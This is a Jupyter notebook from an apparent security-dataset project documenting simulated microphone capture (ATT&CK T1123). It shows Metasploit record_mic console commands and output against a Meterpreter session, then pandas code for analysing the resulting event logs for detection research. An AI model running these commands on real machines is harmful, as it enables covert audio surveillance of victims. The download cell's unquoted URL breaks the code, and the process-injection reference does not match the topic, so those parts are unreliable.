{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "080c1016",
   "metadata": {},
   "source": [
    "# MSF Record Mic"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "42d96d43",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3627b046",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/06/09 |\n",
    "| Modification Date | 2020/06/09 |\n",
    "| Tactics           | [TA0009](https://attack.mitre.org/tactics/TA0009) |\n",
    "| Techniques        | [T1123](https://attack.mitre.org/techniques/T1123) |\n",
    "| Tags              | Microphone Access |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cfe207b8",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries accessing the microphone of an endpoint."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f5b62589",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "99c80b24",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/collection/host/msf_record_mic.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/collection/host/msf_record_mic.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90179557",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c07bd2e1",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab294a41",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Metasploit | [post](https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/multi/manage/record_mic.rb) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "295ff072",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "msf5 exploit(multi/handler) > use post/multi/manage/record_mic\n",
    "msf5 post(multi/manage/record_mic) > set SESSION 2\n",
    "SESSION => 2\n",
    "msf5 post(multi/manage/record_mic) > info\n",
    "\n",
    "      Name: Multi Manage Record Microphone\n",
    "    Module: post/multi/manage/record_mic\n",
    "  Platform: Linux, OSX, Windows\n",
    "      Arch: \n",
    "      Rank: Normal\n",
    "\n",
    "Provided by:\n",
    "  sinn3r <sinn3r@metasploit.com>\n",
    "\n",
    "Compatible session types:\n",
    "  Meterpreter\n",
    "\n",
    "Basic options:\n",
    "  Name      Current Setting  Required  Description\n",
    "  ----      ---------------  --------  -----------\n",
    "  DURATION  5                no        Number of seconds to record\n",
    "  SESSION   2                yes       The session to run this module on.\n",
    "\n",
    "Description:\n",
    "  This module will enable and record your target's microphone. For \n",
    "  non-Windows targets, please use Java meterpreter to be able to use \n",
    "  this feature.\n",
    "\n",
    "msf5 post(multi/manage/record_mic) > run\n",
    "\n",
    "[*] 172.18.39.6 - 20%...\n",
    "[*] 172.18.39.6 - 40%...\n",
    "[*] 172.18.39.6 - 60%...\n",
    "[*] 172.18.39.6 - 80%...\n",
    "[*] 172.18.39.6 - 100%...\n",
    "[*] 172.18.39.6 - Audio size: (55169 bytes)\n",
    "[+] 172.18.39.6 - Audio recording saved: /home/msf/.msf4/loot/20200610025201_default_172.18.39.6_172.18.39.6.audi_358712.wav\n",
    "[*] Post module execution completed\n",
    "msf5 post(multi/manage/record_mic) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e733c68a",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "165a5d86",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ae2125b8",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/collection/host/msf_record_mic.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bbfd2074",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8e3804b3",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8a3a43d5",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6eab1eb",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc0ead23",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
